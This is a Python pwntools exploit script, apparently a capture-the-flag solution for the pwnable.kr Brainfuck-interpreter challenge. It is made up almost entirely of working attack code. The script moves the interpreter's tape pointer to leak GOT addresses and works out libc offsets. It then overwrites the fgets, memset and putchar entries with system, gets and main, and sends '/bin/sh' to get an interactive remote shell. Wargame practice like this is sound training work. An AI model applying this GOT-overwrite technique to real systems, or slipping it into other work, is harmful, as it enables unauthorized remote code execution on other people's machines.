#!/usr/bin/env python3
from pwn import *

#.got.plt:0804A00C off_804A00C     dd offset getchar
#.got.plt:0804A010 off_804A010     dd offset fgets
#.got.plt:0804A014 off_804A014     dd offset __stack_chk_fail
#.got.plt:0804A014
#.got.plt:0804A018 off_804A018     dd offset puts
#.got.plt:0804A01C off_804A01C     dd offset __gmon_start__
#.got.plt:0804A01C
#.got.plt:0804A020 off_804A020     dd offset strlen
#.got.plt:0804A024 off_804A024     dd offset __libc_start_main
#.got.plt:0804A024
#.got.plt:0804A028 off_804A028     dd offset setvbuf
#.got.plt:0804A02C off_804A02C     dd offset memset
#.got.plt:0804A030 off_804A030     dd offset putchar

OFFSET_tape_TO_p = 0x0804A0A0 - 0x0804A080
OFFSET_p_TO_got_fgets = 0x0804A080 - 0x0804A010
OFFSET_stack_chk_fail_TO_memset = 0x0804A02C - 0x804A014

OFFSET_p_TO_main = -0x0804A080 + 0x08048671
OFFSET_fgets_TO_system = -0x0005D540 + 0x0003A920
OFFSET_fgets_TO_gets = -0x0005D540 + 0x0005E770

read_4_bytes = '.>.>.>.'
read_goback = '<<<'
write_4_bytes = ',>,>,>,>'
trigger = '.'

payload = OFFSET_tape_TO_p * '<' + \
          read_4_bytes + read_goback + \
          OFFSET_p_TO_got_fgets * '<' + \
          read_4_bytes + read_goback + \
          write_4_bytes + \
          OFFSET_stack_chk_fail_TO_memset * '>' + \
          write_4_bytes + \
          write_4_bytes + \
          trigger

assert len(payload) <= 1024
p = remote('pwnable.kr', 9001)
sleep(1)
print(p.recv().decode(), end = '')
p.sendline(payload)
sleep(1)

recv = p.recv()
assert len(recv) == 8
addr_p = unpack(recv[0:4], 32)
addr_fgets = unpack(recv[4:8], 32)
addr_system = addr_fgets + OFFSET_fgets_TO_system
addr_gets = addr_fgets + OFFSET_fgets_TO_gets
addr_main = addr_p + OFFSET_p_TO_main

print('-------------------------------')
print('addr_p =', hex(addr_p))
print('addr_fgets =', hex(addr_fgets))
print('addr_system =', hex(addr_system))
print('addr_gets =', hex(addr_gets))
print('addr_main =', hex(addr_main))
print('-------------------------------')

p.send(pack(addr_system, 32) + pack(addr_gets, 32) + pack(addr_main, 32))
sleep(1)
print(p.recv().decode(), end = '')
p.sendline('/bin/sh')

p.interactive()
